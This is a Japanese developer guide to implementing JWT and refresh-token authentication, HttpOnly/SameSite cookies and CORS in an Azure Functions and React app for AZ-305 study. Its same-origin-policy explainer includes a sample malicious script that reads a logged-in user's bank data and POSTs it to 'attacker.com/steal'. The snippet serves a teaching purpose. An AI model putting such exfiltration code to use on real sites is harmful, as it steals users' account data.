# AZ-305試験アプリの認証実装ガイド

## 難しかったところ①：認証（JWT）

ユーザーがログインに成功した後、どのようにログイン状態を保持するかを考えるのにつまづきました。やりたかったことは以下の2つです。

- ユーザーがブラウザをリフレッシュしたとき、再ログインせずにログイン状態を維持できるようにする
- 以前ログインしたことがあるユーザーが再訪問したときは、自動的にログイン状態を復元する（時間制限あり）

今回はトークンベースの認証（JWT方式）を実装しました。さらに、セキュリティを強化するために**リフレッシュトークン**も実装しています。

### 認証フローの概要

大まかな流れは以下の通りです。

1. ユーザーがユーザーネームorメールアドレスとパスワードを入力しログインボタン押下
2. パスワード検証
3. 問題なければ**アクセストークン**（短命・15分）と**リフレッシュトークン**（長命・7日間）を作成
4. 両方のトークンをHttpOnly Cookieに保存し、ログイン状態を維持できるようにする
5. アクセストークンが期限切れになったら、リフレッシュトークンを使って新しいアクセストークンを取得

---

<details>
<summary><b>▶【補足🐧】ログイン時のトークンベースの認証とセッションベースの認証</b></summary>

#### トークンベースの認証（JWT）

ログイン時、サーバーはユーザー情報（ID、名前、有効期限）をJSON形式にし、秘密鍵で署名を付けてJWTを生成します。ブラウザのCookieにJWT全体を保存します。次回アクセス時、サーバーは秘密鍵で署名を検証し、改ざんされていなければトークン内の情報を信頼します。

#### セッションベースの認証

ログイン時、サーバーはランダムなセッションIDを生成し、データベースにどのユーザーのものかを分かるように保存します。ブラウザのCookieにはセッションIDだけを保存します。次回以降のアクセスでは、サーバーはセッションIDを受け取り、そのIDをデータベースで検索して誰のものかを確認します。

</details>

---

<details>
<summary><b>▶【補足🐧】なぜ2種類のトークンが必要なのか</b></summary>

### アクセストークンとリフレッシュトークンを遊園地で例えると

想像してください。あなたは遊園地に行きます。

#### 🎫 アクセストークン = 「アトラクション利用券」

- **有効期限**: 15分
- **役割**: 「この人は今すぐアトラクションに乗れるよ！」という証明
- **使い方**: アトラクションに乗るたびに毎回見せる
- **特徴**: 
  - 短時間だけ使える
  - もし盗まれても、15分経てば使えなくなる
  - 軽くて持ち歩きやすい（サイズが小さい）

#### 🎟️ リフレッシュトークン = 「年間パスポート」

- **有効期限**: 7日間
- **役割**: 「この人は新しいアトラクション利用券をもらえるよ！」という証明
- **使い方**: アトラクション利用券（アクセストークン）が切れたときだけ、窓口で見せて新しい利用券をもらう
- **特徴**:
  - 長期間使える
  - 大切なので、データベースという「金庫」にも保管
  - ログアウトしたら、サーバー側で無効化できる

### なぜ2つ必要なの？

**1つのトークンだけだと問題がある：**

| 方法 | 問題点 |
|------|--------|
| **有効期限を長くする**<br>（例：7日間有効なアクセストークン） | もし盗まれたら、7日間ずっと悪用される😱 |
| **有効期限を短くする**<br>（例：15分ごとに再ログイン） | ユーザーが15分ごとにログインし直さないといけない😫 |

**2つのトークンを使えば解決！**

```
┌─────────────────────────────────────────────────┐
│  ユーザーの体験：7日間ログイン不要 ✨           │
└─────────────────────────────────────────────────┘
         ↓
┌─────────────────────────────────────────────────┐
│  セキュリティ：万が一盗まれても15分で無効 🔒    │
└─────────────────────────────────────────────────┘
```

### 実際の動き

```
[ログイン成功] 
   ↓
2つのトークンをもらう
   ↓
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
アクセストークンでAPI呼び出し ← 普段はこれだけ使う
(15分間有効)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   ↓
[15分経過] アクセストークン期限切れ ⏰
   ↓
リフレッシュトークンを使って
新しいアクセストークンをもらう 🔄
   ↓
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
また15分間、新しいアクセストークンで
API呼び出しできる
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### データベースに保存する理由

リフレッシュトークンは **データベースにも保存** されます。これにより：

✅ **ログアウト時に無効化できる**
- ユーザーがログアウトボタンを押したら、データベースからリフレッシュトークンを削除
- そのトークンはもう使えなくなる

✅ **不正アクセスを検知できる**
- 同じリフレッシュトークンで2回リクエストが来たら、盗まれた可能性がある
- すぐに無効化できる

### トークンローテーション

さらにセキュリティを高めるため、**トークンローテーション**を実装しています：

```
[リフレッシュリクエスト]
   ↓
① 古いリフレッシュトークンを検証
   ↓
② 新しいアクセストークンを発行 ✨
   ↓
③ 新しいリフレッシュトークンも発行 ✨
   ↓
④ 古いリフレッシュトークンを削除 🗑️
```

これにより、リフレッシュトークンも定期的に変わるので、より安全です！

| トークン | 有効期限 | 用途 | 保存場所 |
|---------|----------|------|----------|
| **アクセストークン** | 15分 | APIリクエストの認証 | HttpOnly Cookie |
| **リフレッシュトークン** | 7日間 | 新しいアクセストークンの発行 | HttpOnly Cookie + DB |

</details>

---

<details>
<summary><b>▶【補足🐧】JWTの特徴</b></summary>

### JWTの特徴

JWTは、ドット（`.`）で区切られた3つのパーツで構成されています。

```
ヘッダー.ペイロード.署名
```

| パーツ | 内容 |
|--------|------|
| **ヘッダー** | 「このトークンはHS256で署名してるよ」みたいな情報 |
| **ペイロード** | 誰のトークンか・いつまで有効か（`exp`）などのデータ本体 |
| **署名** | JWTが改ざんされていないことを保証するためのもの |

</details>

---

## コード実装

### アクセストークン作成コード

```csharp
public string Generate(string userId, string userName)
{
    // 署名用秘密鍵の作成　→　印鑑みたいなもの
    var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_secret));

    // 署名方式を指定　→　印鑑の押し方（HMAC-SHA256という方式で印鑑を押す）を決める
    var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);

    // JWT本体の作成
    var token = new JwtSecurityToken(
        // このトークンの持ち主はこういうユーザーですよという情報
        claims: new[]
        {
            new Claim(ClaimTypes.NameIdentifier, userId),
            new Claim(ClaimTypes.Name, userName)
        },

        // トークンの有効期限の設定（15分）
        expires: DateTime.UtcNow.AddMinutes(15),

        // さっき作った印鑑を押す
        signingCredentials: creds
    );
    
    // JWTを文字列に変換して返す
    return new JwtSecurityTokenHandler().WriteToken(token);
}
```

### リフレッシュトークン作成コード

リフレッシュトークンはJWTではなく、安全なランダム文字列を生成します：

```csharp
public string GenerateRefreshToken()
{
    // 安全なランダム文字列を生成（64バイト = 512ビット）
    var randomBytes = new byte[64];
    using (var rng = System.Security.Cryptography.RandomNumberGenerator.Create())
    {
        rng.GetBytes(randomBytes);
    }

    // Base64エンコードして文字列に変換
    return Convert.ToBase64String(randomBytes);
}
```

### JWT検証コード

```csharp
public string? ValidateAndGetUserId(string token)
{
    var handler = new JwtSecurityTokenHandler();

    try
    {
        // ① 署名検証＋有効期限チェック
        var principal = handler.ValidateToken(token, new TokenValidationParameters
        {
            ValidateIssuer = false,
            ValidateAudience = false,
            ValidateLifetime = true,              // 有効期限チェック
            ValidateIssuerSigningKey = true,      // 署名検証
            IssuerSigningKey = new SymmetricSecurityKey(
                Encoding.UTF8.GetBytes(_secret)   // 秘密鍵で検証
            ),
            ClockSkew = TimeSpan.FromMinutes(1)   // 時刻ズレ許容
        }, out _);
   
        // ② ユーザーIDを取得
        return principal.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    }
    catch
    {
        // 改ざん・期限切れなら null
        return null;
    }
}
```

---

## ログイン処理の全体フロー

`AuthService.cs` でログイン処理を行っています：

```csharp
public async Task<(User user, string accessToken, string refreshToken)?> LoginAsync(string loginId, string password)
{
    // 1. ユーザー検索
    var user = await _users.FindByLoginIdAsync(loginId);
    if (user is null || user.IsActive == 0) 
        return null;

    // 2. パスワード検証（PasswordHasherを使用）
    var result = _hasher.VerifyHashedPassword(user, user.PasswordHash, password);
    if (result == PasswordVerificationResult.Failed)
        return null;

    // 3. アクセストークンの発行（15分）
    var accessToken = _jwt.Generate(user.Id, user.Username);

    // 4. リフレッシュトークンの発行（7日間）
    var refreshToken = _jwt.GenerateRefreshToken();
    var expiresAt = DateTime.UtcNow.AddDays(7);
    await _db.SaveRefreshTokenAsync(user.Id, refreshToken, expiresAt);

    return (user, accessToken, refreshToken);
}
```

---

## トークンのCookie保存

`LoginFunction.cs` でトークンをHttpOnly Cookieに保存します：

```csharp
// アクセストークンをCookieに設定（1時間）
var accessExpires = DateTime.UtcNow.AddHours(1);
ok.Headers.Add(
    "Set-Cookie",
    $"access_token={accessToken}; Path=/; HttpOnly; SameSite=Strict; Max-Age=3600; Expires={accessExpires.ToString("R")}"
);

// リフレッシュトークンをCookieに設定（7日間）
var refreshExpires = DateTime.UtcNow.AddDays(7);
ok.Headers.Add(
    "Set-Cookie",
    $"refresh_token={refreshToken}; Path=/; HttpOnly; SameSite=Strict; Max-Age=604800; Expires={refreshExpires.ToString("R")}"
);
```

---

## トークンリフレッシュの仕組み

アクセストークンが期限切れになったとき、`RefreshFunction.cs` で新しいトークンを発行します：

```csharp
// 1. Cookieからリフレッシュトークンを取得
var refreshToken = /* Cookieから取得 */;

// 2. リフレッシュトークンを検証（DBに存在するか・有効期限内か）
var userId = await _db.ValidateRefreshTokenAsync(refreshToken);
if (userId == null)
{
    return await Unauthorized(req, "Invalid or expired refresh token");
}

// 3. 新しいアクセストークンを生成
var newAccessToken = _jwt.Generate(userId, userName);

// 4. 新しいリフレッシュトークンを生成（トークンローテーション）
var newRefreshToken = _jwt.GenerateRefreshToken();
var expiresAt = DateTime.UtcNow.AddDays(7);

// 5. 古いリフレッシュトークンを削除
await _db.DeleteRefreshTokenAsync(refreshToken);

// 6. 新しいリフレッシュトークンを保存
await _db.SaveRefreshTokenAsync(userId, newRefreshToken, expiresAt);

// 7. 両方のトークンをCookieに設定
// （アクセストークンとリフレッシュトークンを更新）
```

---

## JWTの保存先とセキュリティ対策

ログイン成功後、JWTを **HttpOnly Cookie** に保存する方式にしました。

実際のコードはこんな感じです。

```csharp
ok.Headers.Add(
    "Set-Cookie", 
    $"access_token={token}; Path=/; HttpOnly; SameSite=Strict; Max-Age=3600"
);
```

`HttpOnly` と `SameSite=Strict` という2つの属性を設定することで、それぞれXSSとCSRFの2種類の攻撃への対策を行っています。

---

<details>
<summary><b>▶【補足🐧】XSSとCSRFってなに？なぜ対策できるの？</b></summary>

### XSS（クロスサイトスクリプティング）対策：HttpOnly

クロスサイトスクリプティングは、悪意のある第三者がサイトに不正なJavaScriptを埋め込む攻撃です。JWTを `localStorage` に保存していると、こんな感じのコードで盗まれてしまいます。

```javascript
const token = localStorage.getItem('jwt')
// そのままなりすましログインに使われてしまう
```

`HttpOnly` をCookieにつけると、JavaScriptからCookieを読めなくなります。不正なJSが動いてもJWTを取得できないので、盗難を防げます。

---

### CSRF（クロスサイトリクエストフォージェリ）対策：SameSite

HttpOnly CookieはXSSに強い反面、CSRF（クロスサイトリクエストフォージェリ）に弱くなるという特性があります。

クロスサイトリクエストフォージェリは、ユーザーが意図していないリクエストを別サイトから勝手に送らせる攻撃です。HttpOnly Cookieは「JSから読めない」だけで、「ブラウザが自動送信する」動作は止められません。そのため悪意のあるサイトからリクエストが来ても、ブラウザがCookieを自動で添付してしまいます。

`SameSite=Strict` を設定すると、異なるサイトからのリクエストにはCookieを送らないという制約がつきます。

```
自分のサイト内のリクエスト → Cookie を送る  
別のサイトからのリクエスト  → Cookie を送らない
```

2つの属性をセットで使うことで、XSSとCSRFの両方に対応しています。

**補足：**  
`SameSite` における「サイト」の判定はドメインベースで行われます。
`localhost:5173` と `localhost:7071` はポートが違っても
どちらも `localhost` なので同じサイト扱いとなり、
`SameSite=Strict` でも Cookie は送られます。

</details>

---

## 難しかったところ②：同一オリジンポリシーとCORS

JWTの実装ができましたが、もう一つ壁がありました。

フロントからバックエンドのAPIを呼び出す時、ただリクエストを送るだけではブラウザに弾かれてしまいます。

今回、フロントエンドはReact+Vite、バックエンドはAzure Functionsを使っています。これにより、ローカル開発ではそれぞれ別ポートで動いています。ブラウザから見ると「異なるオリジンへのリクエスト」と判断されてしまい、**同一オリジンポリシー**によりブロックされてしまいます。

---

<details>
<summary><b>▶【補足🐧】同一オリジンポリシーってなに？</b></summary>

### 同一オリジンポリシーとは

同一オリジンポリシーとは、悪意のあるサイトが、他のサイトのデータを勝手に読み取るのを防ぐためのものです。

例えばあなたが **bank.com** という銀行サイトにログインし、情報がCookieに保持されたとします。その状態で、別タブで **devil.com** というサイトを開きました。**devil.com** は悪意のあるサイトですが、あなたは気が付かず開いてしまいました。

**devil.com** には以下のようなHTMLが書かれています。

```html
<h1>面白い記事だよ！👿</h1>
   
<script>
// ユーザーの銀行口座情報を盗む
fetch('https://bank.com/api/account', {
    credentials: 'include'  // ← Cookieを含める
})
.then(response => response.json())
.then(data => {
    // 盗んだデータを攻撃者のサーバーに送信
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
        // 口座番号、残高、取引履歴などが送られる
    });
});
</script>
```

**devil.com** から **bank.com** にアクセスできるようになっていた場合、このようなことが起こり得ます。

このようなことを防ぐため、ブラウザには同一オリジンポリシーをつけ、**異なるオリジンへのアクセスは禁止する**ようになっています。

</details>

---

## 解決方法：CORSヘッダーをつける

CORS（クロスオリジンリソース共有）ヘッダーとは、サーバーがブラウザに対して「このオリジンからのアクセスを許可する」と伝えるための **HTTPレスポンスヘッダー** です。

これにより、同一オリジンポリシーの問題を解決できます。

```
フロントエンド (localhost:5173)  ⇄  バックエンド (localhost:7071)
                    ↑ CORSで許可
```

---

<details>
<summary><b>▶【補足🐧】HTTPレスポンスヘッダーってなに？</b></summary>

### HTTPレスポンスヘッダーとは

HTTPレスポンスヘッダーとは、サーバーがブラウザに返す **データの説明書き** のようなものです。

HTTPレスポンスは主に、

```
ステータスライン
レスポンスヘッダー
空行
レスポンスボディ
```

で構成されています。

ステータスラインには `HTTP/1.1 200 OK` などが書かれ、レスポンスボディには実際のデータが入ります（今回であればユーザーネームなど）。レスポンスヘッダーはレスポンスボディに書いてあるデータがどんなデータなのかを説明する役割を持っています。

</details>

---

## CORS実装コード

バックエンドでブラウザに何かを返すとき（エラーや成功レスポンスなど）はCORSヘッダーをつけて送ります。`CorsHelper.cs` という専用のヘルパークラスを作成し、都度呼び出す形にしました。

```csharp
public static void AddCorsHeaders(HttpRequestData req, HttpResponseData res)
{
    // リクエストの送信元（Originヘッダー）確認
    if(req.Headers.TryGetValues("Origin", out var origins))
    {
        // 複数の場合は最初の一つを取得
        var origin = origins.First();

        // 許可されたリストにあるか確認
        if (AllowedOrigin.Contains(origin))
        {
            // このオリジンからのアクセスとCookie送信を許可
            res.Headers.Add("Access-Control-Allow-Origin", origin);
            res.Headers.Add("Access-Control-Allow-Credentials", "true");
        }
    }
    
    // 許可するリクエストヘッダーとHTTPメソッドの種類
    res.Headers.Add("Access-Control-Allow-Headers", "Content-Type");
    res.Headers.Add("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
}
```

許可するオリジンのリストは環境変数から取得し、開発環境では `localhost:5173` と `localhost:5174` の両方を許可しています：

```csharp
private static HashSet<string> GetAllowedOrigins()
{
    // 環境変数 "ALLOWED_ORIGINS" から値を取得
    var originsStr = Environment.GetEnvironmentVariable("ALLOWED_ORIGINS");

    if (string.IsNullOrEmpty(originsStr))
    {
        // 環境変数がない場合はデフォルト値（開発環境用）
        return new HashSet<string> 
        { 
            "http://localhost:5173",
            "http://localhost:5174"
        };
    }

    // カンマ区切りで複数のオリジンを設定できるようにする
    return originsStr.Split(',')
                     .Select(o => o.Trim())
                     .ToHashSet();
}
```

---

## データベーススキーマ

リフレッシュトークンは `refresh_tokens` テーブルに保存されます：

```sql
CREATE TABLE IF NOT EXISTS refresh_tokens (
    id          TEXT NOT NULL PRIMARY KEY,
    user_id     TEXT NOT NULL REFERENCES users(id),
    token       TEXT NOT NULL UNIQUE,
    expires_at  TEXT NOT NULL,
    created_at  TEXT NOT NULL
);
```

---

## まとめ

このプロジェクトでは、以下のセキュリティ対策を実装しました：

1. **JWT + リフレッシュトークンのデュアルトークン方式**
   - アクセストークン（15分）で短期間の認証
   - リフレッシュトークン（7日間）で長期間のログイン状態維持

2. **トークンローテーション**
   - リフレッシュ時に新しいトークンを発行し、古いトークンを無効化

3. **HttpOnly Cookie**
   - XSS攻撃からトークンを保護

4. **SameSite=Strict**
   - CSRF攻撃を防止

5. **CORS設定**
   - 許可されたオリジンからのみAPIアクセスを許可
   - 環境変数による柔軟な設定

これらの実装により、安全でユーザーフレンドリーな認証システムを構築できました。
